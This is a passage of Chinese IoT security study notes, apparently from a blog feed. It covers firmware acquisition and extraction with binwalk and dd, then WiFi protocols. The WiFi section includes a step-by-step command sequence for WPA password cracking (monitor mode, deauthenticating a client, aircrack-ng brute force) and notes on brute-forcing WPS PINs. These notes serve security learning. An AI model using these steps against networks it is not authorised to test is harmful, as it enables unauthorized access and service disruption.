<h2 id="0x03-固件分析环境搭建-常用分析工具详解"><a href="#0x03-固件分析环境搭建-常用分析工具详解" class="headerlink" title="0x03 固件分析环境搭建&amp;&amp;常用分析工具详解"></a>0x03 固件分析环境搭建&amp;&amp;常用分析工具详解</h2><h3 id="1-固件分析环境搭建"><a href="#1-固件分析环境搭建" class="headerlink" title="1. 固件分析环境搭建"></a>1. 固件分析环境搭建</h3><h4 id="1-1-系统选择"><a href="#1-1-系统选择" class="headerlink" title="1.1 系统选择"></a>1.1 系统选择</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828150716964.png" alt="image-20220828150716964"></p>
<p>这里视频里建议用低版本的ubuntu，但是由于自己部署低版本出问题稍微有亿点多，所以这里我用的是Attify安全团队他们部署好的专用于物联网渗透测试和安全分析的一个虚拟机镜像AttifyOS，最新版是基于ubuntu18.04，上边已经提前安装好了很多常用的软件，比较节省时间，当然也可以选择自己部署环境。</p>
<p>Github仓库地址如下：<a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a></p>
<h4 id="1-2-固件提取"><a href="#1-2-固件提取" class="headerlink" title="1.2 固件提取"></a>1.2 固件提取</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828150923916.png" alt="image-20220828150923916"></p>
<p><strong>dd：</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828150955042.png" alt="image-20220828150955042"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151010530.png" alt="image-20220828151010530"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151024701.png" alt="image-20220828151024701"></p>
<p><strong>binwalk：</strong></p>
<p>项目地址：<a href="https://github.com/ReFirmLabs/binwalk">https://github.com/ReFirmLabs/binwalk</a></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151139212.png" alt="image-20220828151139212"></p>
<p>如果熵为0则未加密，否则，基本上是加密的。(这句好像是错的，请自己查证下)</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151224948.png" alt="image-20220828151224948"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151238625.png" alt="image-20220828151238625"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151303726.png" alt="image-20220828151303726"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151311354.png" alt="image-20220828151311354"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151321716.png" alt="image-20220828151321716"></p>
<h4 id="1-2-二进制应用分析"><a href="#1-2-二进制应用分析" class="headerlink" title="1.2 二进制应用分析"></a>1.2 二进制应用分析</h4><ol>
<li>angr</li>
<li>IDA</li>
<li>Ghidra</li>
<li>Gdb(gef&#x2F;pwndbg&#x2F;peda)</li>
</ol>
<p><strong>angr:</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151515084.png" alt="image-20220828151515084"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151534059.png" alt="image-20220828151534059"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151553278.png" alt="image-20220828151553278"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151606502.png" alt="image-20220828151606502"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151622479.png" alt="image-20220828151622479"></p>
<h4 id="1-4-固件模拟"><a href="#1-4-固件模拟" class="headerlink" title="1.4 固件模拟"></a>1.4 固件模拟</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151656506.png" alt="image-20220828151656506"></p>
<p><strong>Qemu</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151711011.png" alt="image-20220828151711011"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151719780.png" alt="image-20220828151719780"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151730855.png" alt="image-20220828151730855"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151748526.png" alt="image-20220828151748526"></p>
<p><strong>Firmadyne</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151906926.png" alt="image-20220828151906926"></p>
<p>Firmadyne依赖Binwalk和Qemu</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828151956270.png" alt="image-20220828151956270"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828152010114.png" alt="image-20220828152010114"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828152029875.png" alt="image-20220828152029875"></p>
<p><strong>Firmware Analysis Toolkit</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220828152213894.png" alt="image-20220828152213894"></p>
<p>提供一些敏感文件查找等等插件</p>
<h2 id="0x04-固件提取详解"><a href="#0x04-固件提取详解" class="headerlink" title="0x04 固件提取详解"></a>0x04 固件提取详解</h2><h3 id="1-固件获取"><a href="#1-固件获取" class="headerlink" title="1. 固件获取"></a>1. 固件获取</h3><p>固件获取是指：手中没有固件，如何获取.bin等类型的固件</p>
<h4 id="1-1-固件"><a href="#1-1-固件" class="headerlink" title="1.1 固件"></a>1.1 固件</h4><ul>
<li><p>固件（firmware），是一种嵌入在硬件设备中的软件（可简单理解为嵌入式设备的操作系统）。通常它是位于特殊应用集成电路（ASIC）或可变成逻辑器件（PLD）之中的内存或EEPROM或PROM里，有的可以让用户更新。可以应用在非常广泛的电子产品中，从遥控器，计算器到电脑中的键盘、硬盘，甚至工业机器人中都可以看见它的身影。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316162638310.png" alt="image-20230316162638310"></p>
</li>
</ul>
<h4 id="1-2-固件获取"><a href="#1-2-固件获取" class="headerlink" title="1.2 固件获取"></a>1.2 固件获取</h4><ul>
<li>官方或售后获取固件</li>
<li>从第三方网站或者专门的人获取固件</li>
<li>抓取升级包的地址</li>
<li>逆向升级软件获取升级接口</li>
<li>使用编程器从Flash中读取固件</li>
<li>通过调试接口，进入设备提取固件</li>
<li>用逻辑分析仪获取信息</li>
</ul>
<ol>
<li><p>从官网、FTP服务器下载固件或售后处获取固件</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316163251842.png" alt="image-20230316163251842"></p>
<p><strong>缺点：</strong>官方提供的版本不完整；固件加密或者官网不提供</p>
</li>
<li><p>从第三方网站下载固件或找专门的人购买</p>
<p><strong>缺点：</strong>提供的型号不完整；需要花钱</p>
</li>
<li><p>抓取升级包的地址</p>
<p><strong>工具：</strong>HUB&#x2F;Wireshark&#x2F;ettercap</p>
<p><strong>在线升级：</strong>抓包，分析固件地址，下载固件</p>
<p><strong>新老固件通吃：</strong></p>
<ul>
<li>升级前记录下固件版本和名称</li>
<li>升级后，根据命名规则拼接老固件地址</li>
</ul>
</li>
<li><p>逆向升级软件获取升级接口</p>
<p>厂家提供上位机升级软件（例如：手机端APP），升级软件在升级前，现在上位机解密固件，在传输不加密的固件到设备升级的方式</p>
<p>逆向分析，解密升级固件部分：抓取数据包</p>
</li>
<li><p>使用编程器从Flash中读取固件</p>
<p>将芯片的引脚连接到编程器对应的引脚进行读取</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316164337031.png" alt="image-20230316164337031"></p>
<p>步骤：1.拆下芯片；2.使用编程器进行提取；3.将Flash焊回电路板</p>
<p>在未拆解芯片的情况下提取固件：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316164629299.png" alt="image-20230316164629299"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316164732373.png" alt="image-20230316164732373"></p>
</li>
<li><p>通过调试接口，进入U-BOOT提取固件</p>
<p>获取U-BOOT交互式shell</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316165002908.png" alt="image-20230316165002908"></p>
</li>
<li><p>利用逻辑分析仪获取信息</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316165248154.png" alt="image-20230316165248154"></p>
<p> <img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316165322693.png" alt="image-20230316165322693"></p>
</li>
</ol>
<h3 id="2-固件提取"><a href="#2-固件提取" class="headerlink" title="2. 固件提取"></a>2. 固件提取</h3><p>固件提取是指：已经有固件，如何从.bin等类型的固件中提取数据、文件系统等。</p>
<ul>
<li>strings</li>
<li>hexdump</li>
<li>file</li>
<li>binwalk</li>
<li>fdisk</li>
<li>dd</li>
<li>GUI hex</li>
</ul>
<ol>
<li><p><strong>strings</strong></p>
<p><strong>strings</strong>命令在对象文件或者二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。<strong>strings</strong>命令对识别随机对象文件很有用。命令参数如下所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316170304582.png" alt="image-20230316170304582"></p>
<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">strings test.bin | <span class="built_in">head</span> -n 20</span></span><br><span class="line">signature=wrgac43s_dlink.2015_dir822c1</span><br><span class="line">dev=/dev/mtdblock/1</span><br><span class="line">type=firmware</span><br><span class="line">cs6b</span><br><span class="line"> @!!</span><br><span class="line"><span class="meta prompt_">@$</span><span class="language-bash">&lt;</span>	</span><br><span class="line"><span class="meta prompt_">@$</span><span class="language-bash">&lt;</span>	</span><br><span class="line">@8!$</span><br><span class="line">···</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>hexdump</strong></p>
<p><strong>hexdump</strong>命令一般用来查看二进制文件的十六进制编码，但实际上他能查看任何文件，而不只限于二进制文件。命令参数如下所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316171022481.png" alt="image-20230316171022481"></p>
<p>示例：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230317153108851.png" alt="image-20230317153108851"></p>
</li>
<li><p><strong>file</strong>命令用来探测给定文件类型。file命令对文件的检查分为文件系统、魔法幻数检查和语言检查3个过程。命令参数如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230316171208266.png" alt="image-20230316171208266"></p>
<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file test.bin</span> </span><br><span class="line">test.bin: data</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file test_firmware</span> </span><br><span class="line">test_firmware: Squashfs filesystem, little endian, version 1024.0, compressed, -3519191473859854336 bytes, 805896192 inodes, blocksize: 512 bytes, created: Thu Jun  4 12:04:42 2020</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>binwalk</strong>是一款快速、易用，用于分析，逆向工程和提取固件映像的工具。简单易用，完全自动化脚本，并通过自定义签名，提取规则和插件模块，很重要的一点就是可以轻松地拓展。</p>
<p>常用参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-e, --extract                Automatically extract known file types</span><br><span class="line">-M, --matryoshka             Recursively scan extracted files</span><br><span class="line">-E, --entropy                Calculate file entropy</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>fdisk</strong>是一个创建和维护分区表的程序，它兼容DOS类型的分区表、BSD或者SUN类型的磁盘列表。</p>
<p><code>fdisk -l</code>或<code>fdisk -lu</code>（- u 选项指定以segment段标记分区大小，而不是默认的”cylinders(柱面)”）</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230317101454236.png" alt="image-20230317101454236"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230317101435568.png" alt="image-20230317101435568"></p>
</li>
<li><p><strong>dd</strong>命令用于读取、转换并输出数据。dd可以从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。</p>
<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">dd</span> skip=1376404 <span class="keyword">if</span>=test.bin bs=1 of=test_firmware</span></span><br><span class="line">记录了5386240+0 的读入</span><br><span class="line">记录了5386240+0 的写出</span><br><span class="line">5386240字节（5.4 MB，5.1 MiB）已复制，5.94871 s，905 kB/s</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>GUI hex</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230317101530509.png" alt="image-20230317101530509"></p>
</li>
</ol>
<h4 id="手动方式提取固件文件系统"><a href="#手动方式提取固件文件系统" class="headerlink" title="手动方式提取固件文件系统"></a>手动方式提取固件文件系统</h4><p>首先我们使用<strong>hexdump</strong>命令，对获取到的固件进行文件系统签名的检索：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hexdump -C test.bin |grep <span class="string">&quot;sqsh\|hsqs\|sqlz\|qshs\|tqsh\|hsqt\|shsq&quot;</span></span></span><br><span class="line">00150090  00 00 00 00 68 73 71 73  30 09 00 00 5e d8 e3 5a  |....hsqs0...^..Z|</span><br></pre></td></tr></table></figure>

<p>在地址00150090（16进制）处发现SquashFS文件系统的签名（即hsqs）。由此可以确定这个固件的文件系统是小端的SquashFS。</p>
<p>接下来使用<strong>dd</strong>命令将从 00150090 地址开始的内容提取出来，需要注意的是我们要将其转化成十进制的表示形式（1376400），并且由于hsqs前面有4字节的填充，所以真正提取是，要在 00150090 的基础上加 4 （即1376404）</p>
<p>计算好地址后，可以使用<strong>dd</strong>命令提取，其命令格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=输入文件名 bs=读入/输出大小 skip=从文件头跳过块数 of=输出文件名</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">dd</span> skip=1376404 <span class="keyword">if</span>=test.bin bs=1 of=test_firmware</span></span><br><span class="line">记录了5386240+0 的读入</span><br><span class="line">记录了5386240+0 的写出</span><br><span class="line">5386240字节（5.4 MB，5.1 MiB）已复制，5.94871 s，905 kB/s</span><br></pre></td></tr></table></figure>

<p>接下来执行<strong>file</strong>命令，查看提取出的文件系统时候正确</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file test_firmware</span> </span><br><span class="line">test_firmware: Squashfs filesystem, little endian, version 1024.0, compressed, -3519191473859854336 bytes, 805896192 inodes, blocksize: 512 bytes, created: Thu Jun  4 12:04:42 2020</span><br></pre></td></tr></table></figure>

<p>可以看到这个固件文件系统为小段的Squash FS文件系统</p>
<p>接下来执行 <strong>unsquashfs</strong> 命令来提出整个文件系统</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">unsquashfs test_firmware</span> </span><br><span class="line">Parallel unsquashfs: Using 8 processors</span><br><span class="line">2246 inodes (2292 blocks) to write</span><br><span class="line"></span><br><span class="line">[===========================================================|  ] 2225/2292  97%</span><br><span class="line"></span><br><span class="line">created 1987 files</span><br><span class="line">created 106 directories</span><br><span class="line">created 192 symlinks</span><br><span class="line">created 0 devices</span><br><span class="line">created 0 fifos</span><br></pre></td></tr></table></figure>

<p>至此，我们已经成功地提取到了Squash FS格式的固件，其中提取的文件夹名称为squash-root</p>
<p>接下来执行 <strong>ls</strong> 命令，预览该文件夹下的各个文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -ll squashfs-root/</span></span><br><span class="line">总用量 48</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 bin</span><br><span class="line">drwxrwxr-x  9 guoxb guoxb 4096 Apr 28  2018 dev</span><br><span class="line">drwxrwxr-x 13 guoxb guoxb 4096 Apr 28  2018 etc</span><br><span class="line">lrwxrwxrwx  1 guoxb guoxb    9 Apr 28  2018 home -&gt; /var/home</span><br><span class="line">drwxrwxr-x 10 guoxb guoxb 4096 Apr 28  2018 htdocs</span><br><span class="line">drwxr-xr-x  3 guoxb guoxb 4096 Apr 28  2018 lib</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 mnt</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 proc</span><br><span class="line">drwxr-xr-x  2 guoxb guoxb 4096 Apr 28  2018 sbin</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 sys</span><br><span class="line">lrwxrwxrwx  1 guoxb guoxb    8 Apr 28  2018 tmp -&gt; /var/tmp</span><br><span class="line">drwxrwxr-x  5 guoxb guoxb 4096 Apr 28  2018 usr</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 var</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 www</span><br></pre></td></tr></table></figure>

<h4 id="使用工具提取"><a href="#使用工具提取" class="headerlink" title="使用工具提取"></a>使用工具提取</h4><p>采用 <strong>binwalk</strong> 工具自动提取文件系统，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me test.bin</span><br></pre></td></tr></table></figure>

<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230317161003457.png" alt="image-20230317161003457"></p>
<p>使用 <strong>binwalk</strong> 工具提取出的文件系统以 “_固件名.extracted”命名。打开 _test.bin.extracted 文件夹，可以看到 squashfs-root 文件夹，里面存放的就是获取的文件系统。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -ll _test.bin.extracted/squashfs-root</span></span><br><span class="line">总用量 48</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 bin</span><br><span class="line">drwxrwxr-x  9 guoxb guoxb 4096 Apr 28  2018 dev</span><br><span class="line">drwxrwxr-x 13 guoxb guoxb 4096 Apr 28  2018 etc</span><br><span class="line">lrwxrwxrwx  1 guoxb guoxb    9 Apr 28  2018 home -&gt; /var/home</span><br><span class="line">drwxrwxr-x 10 guoxb guoxb 4096 Apr 28  2018 htdocs</span><br><span class="line">drwxr-xr-x  3 guoxb guoxb 4096 Apr 28  2018 lib</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 mnt</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 proc</span><br><span class="line">drwxr-xr-x  2 guoxb guoxb 4096 Apr 28  2018 sbin</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 sys</span><br><span class="line">lrwxrwxrwx  1 guoxb guoxb    8 Apr 28  2018 tmp -&gt; /var/tmp</span><br><span class="line">drwxrwxr-x  5 guoxb guoxb 4096 Apr 28  2018 usr</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 var</span><br><span class="line">drwxrwxr-x  2 guoxb guoxb 4096 Apr 28  2018 www</span><br></pre></td></tr></table></figure>



<h2 id="0x05-实际漏洞分析"><a href="#0x05-实际漏洞分析" class="headerlink" title="0x05 实际漏洞分析"></a>0x05 实际漏洞分析</h2><p>见另外的专栏 《IoT设备漏洞复现》</p>
]]></content>
      <categories>
        <category>IoT安全入门</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT安全入门06</title>
    <url>/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A806/</url>
    <content><![CDATA[<h1 id="第六章-物联网架构之物联网协议"><a href="#第六章-物联网架构之物联网协议" class="headerlink" title="第六章 物联网架构之物联网协议"></a>第六章 物联网架构之物联网协议</h1><h2 id="0x01-wifi协议"><a href="#0x01-wifi协议" class="headerlink" title="0x01 wifi协议"></a>0x01 wifi协议</h2><h3 id="1-物联网组成"><a href="#1-物联网组成" class="headerlink" title="1. 物联网组成"></a>1. 物联网组成</h3><p>物联网核心在人、机、云之间的信息互联，因此智能设备、云端、手机端会通过各种协议进行数据的交换。</p>
<img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322110650647.png" alt="image-20230322110650647" style="zoom:80%;" />

<span id="more"></span>

<h3 id="2-物联网通信协议"><a href="#2-物联网通信协议" class="headerlink" title="2. 物联网通信协议"></a>2. 物联网通信协议</h3><p>通信协议分类：接入类协议；通信类协议</p>
<p>接入类协议：一般负责子网内设备间的组网及通信，市场上常见的有Zigbee、蓝牙以及wifi协议。</p>
<p>通信类协议：主要是运作在传统互联网TCP&#x2F;IP协议之上的设备远程通讯协议，负责设备通过互联网进行数据交换及通信，例如GPRS&#x2F;3G&#x2F;4G等。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322110919655.png" alt="image-20230322110919655"></p>
<h3 id="3-WLAN"><a href="#3-WLAN" class="headerlink" title="3. WLAN"></a>3. WLAN</h3><p>wlan指的是无线局域网络（Wireless Local Area Networks）。它是相当便利的数据传输系统，它利用射频（Radio Frequency；RF）的技术，使用电磁波来取代旧式的双绞铜线（Coaxial）所构成的局域网络，在空中进行通信连接；该技术的出现绝不是用来取代有线局域网络，而是用来弥补有线局域网络的不足，以达到网络延伸的目的，使得无线局域网络能利用简单的存取架构让用户透过它，实现无网线、无距离限制的通畅网络。</p>
<h3 id="4-WIFI"><a href="#4-WIFI" class="headerlink" title="4. WIFI"></a>4. WIFI</h3><p>Wi-Fi在中文中又称作”行动热点”，是Wi-Fi联盟制造商的商标做为产品的品牌认证，是一个创建于IEEE 802.11标准的可以将个人电脑、手持设备（如pad、手机）等终端以无线方式互相连接的技术，事实上它也是一种高频无线电信号。</p>
<h3 id="5-无线网-VS-有线网"><a href="#5-无线网-VS-有线网" class="headerlink" title="5. 无线网 VS 有线网"></a>5. 无线网 VS 有线网</h3><ul>
<li>通信双方都是通过无线进行通信，所以通信之前需要建立连接；有线网络就直接用线缆连接。</li>
<li>通信双方通信方式是半双工的通信方式；有线网络可以是全双工</li>
<li>通信时在网络层一下出错的概率非常高；有线网络出错概率非常小</li>
<li>数据是在无线环境下进行的，所以抓包非常容易，存在安全隐患</li>
<li>收发无线信号，功耗较大</li>
<li>相对有线网络吞吐量低</li>
</ul>
<h3 id="6-IEEE-802-11协议"><a href="#6-IEEE-802-11协议" class="headerlink" title="6. IEEE 802.11协议"></a>6. IEEE 802.11协议</h3><p>Ethenet和Wifi采用的协议都属于IEEE 802协议集。其中，Ethenet以802.3协议做为其网络层以下的协议；而Wifi以802.11做为其网络层以下的协议。网络层之上的部分二者一致。</p>
<h4 id="802-11-工作方式"><a href="#802-11-工作方式" class="headerlink" title="802.11 工作方式"></a>802.11 工作方式</h4><p>802.11定义了两种类型的设备</p>
<ul>
<li>无线站（STA）eg：笔记本</li>
<li>无线接入点（AP）eg：路由器F1，中转协议</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322112256750.png" alt="image-20230322112256750"></p>
<h3 id="频谱划分"><a href="#频谱划分" class="headerlink" title="频谱划分"></a>频谱划分</h3><p>2.4gWiFi总共有14个信道</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322112550392.png" alt="image-20230322112550392"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322112739464.png" alt="image-20230322112739464"></p>
<h3 id="SSID和BSSID"><a href="#SSID和BSSID" class="headerlink" title="SSID和BSSID"></a>SSID和BSSID</h3><ol>
<li><p>基本服务集（BSS）</p>
<p>基本服务集是802.11 LAN的基本组成模块。能互相进行无线通信的STA可以组成一个BSS（Basic　Service Set）。如果一个站移出BSS的覆盖范围，它将不能再与BSS的其他成员通信。</p>
</li>
<li><p>拓展服务集（ESS）</p>
<p>多个BSS可以构成一个拓展网络，称为拓展服务集（ESS）网络，一个ESS网络内部的STA可以互相通信，是采用相同的SSID的多个BSS形成的更大规模的虚拟BSS。连接BSS的组件称为分布式系统（Distribution System，DS）。</p>
</li>
</ol>
<p><strong>SSID&#x2F;BSSID</strong></p>
<p>服务集的标识，在同一SS内的所有STA和AP必须具有相同的SSID，否则无法通信</p>
<ul>
<li>SSID是一个ESS的网络标识（如：TP_Link1412）</li>
<li>BSSID是一个BSS的标识（实际上就是AP的MAC地址）</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322114651331.png" alt="image-20230322114651331"></p>
<h3 id="无线接入过程三个阶段"><a href="#无线接入过程三个阶段" class="headerlink" title="无线接入过程三个阶段"></a>无线接入过程三个阶段</h3><p>STA启动初始化、开始正式使用AP传送数据帧前，要经过三个阶段才能够接入：</p>
<p>1）扫描阶段（SCAN）主动&#x2F;被动</p>
<p>2）认证阶段（Authentication）WEP&#x2F;WPA</p>
<p>3）关联（Association）</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322115929807.png" alt="image-20230322115929807"></p>
<h3 id="认证连接方式"><a href="#认证连接方式" class="headerlink" title="认证连接方式"></a>认证连接方式</h3><ul>
<li>无认证</li>
<li>有认证<ul>
<li>SSID–密码认证<ul>
<li>wep</li>
<li>wpa&#x2F;wpa2</li>
</ul>
</li>
<li>WPS</li>
</ul>
</li>
</ul>
<p><strong>WEP</strong></p>
<p>WEP是有线等效保密（Wired Equivalent Privacy）的简称，一种在链路层加密的方式来防止非法用户窃听或侵入无线网络。在2003年被WPA所淘汰。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322120639552.png" alt="image-20230322120639552"></p>
<p><strong>WPA&#x2F;WPA2</strong></p>
<p>WPA主要采用的是临时密钥完整性协议（TKIP1）加密算法，TKIP旨在改进WEP，且无需依赖全新硬件来运行；WPA2则强制使用AES-CCMP算法来进行加密，比TKIP更强大、更坚固。</p>
<p>WPA和WPA2支持两种身份验证机制：</p>
<ul>
<li>企业：基于EAP的身份验证</li>
<li>个人：基于预共享密钥的身份验证（WPA-PSK）</li>
</ul>
<p><strong>WPA握手流程</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322121045052.png" alt="image-20230322121045052"></p>
<p><strong>WPA WIFI密码暴力破解</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看无线网卡名:iwconfig</span><br><span class="line">关掉影响的进程:airmon-ng check kill</span><br><span class="line">设置网卡为监听模式:airmon-ng start INTERFACE</span><br><span class="line">扫描附近的wifi:airodump-ng INTERFACE</span><br><span class="line">选定一个路由器，并监听其流量:airodump-ng -c CHANNEL --bssid AP_MAC -w FILENAME INTERFACE</span><br><span class="line">选定连接的一个客户端，进行攻击:aireplay-ng -0 50 -a AP_MAC [-c STA_AP] INTERFACE</span><br><span class="line">对抓取到的cap包进行暴力破解: aircrack-ng -w PASSWORD.txt FILENAME.cap</span><br></pre></td></tr></table></figure>

<p>VMware虚拟机需要实体无线网卡</p>
<p>具体内容参考对应视频讲解。</p>
<p><strong>WPS的安全问题</strong></p>
<p>WPS（Wi-Fi Protected Setup）是Wi-Fi保护设置的英文缩写，主要致力于简化无线局域网安装及安全性能的配置工作。在WPS认证中PIN码是网络设备间获得接入的唯一要求，不需要其他身份识别方式，这就让暴力破解变得可行。</p>
<p>WPS PIN码的第八位数是一个校验和，因此暴力破解只需要算出前7位</p>
<p>而在实施PIN的身份识别时，接入点实际上是要找出这个PIN的前四位和后三位是否分别正确</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230322123332815.png" alt="image-20230322123332815"></p>
<h2 id="0x02-Zigbee协议"><a href="#0x02-Zigbee协议" class="headerlink" title="0x02 Zigbee协议"></a>0x02 Zigbee协议</h2><h3 id="1-Zigbee协议简介"><a href="#1-Zigbee协议简介" class="headerlink" title="1. Zigbee协议简介"></a>1. Zigbee协议简介</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230321205130020.png" alt="image-20230321205130020"></p>
<h4 id="1-1-Zigbee简介"><a href="#1-1-Zigbee简介" class="headerlink" title="1.1 Zigbee简介"></a>1.1 Zigbee简介</h4><p>Zigbee是IEEE 802.15.4标准的低功耗局域网协议，是一种短距离、低功耗的无线通信技术</p>
<p>主要适用于自动控制和远程控制领域，可以嵌入各种设备</p>
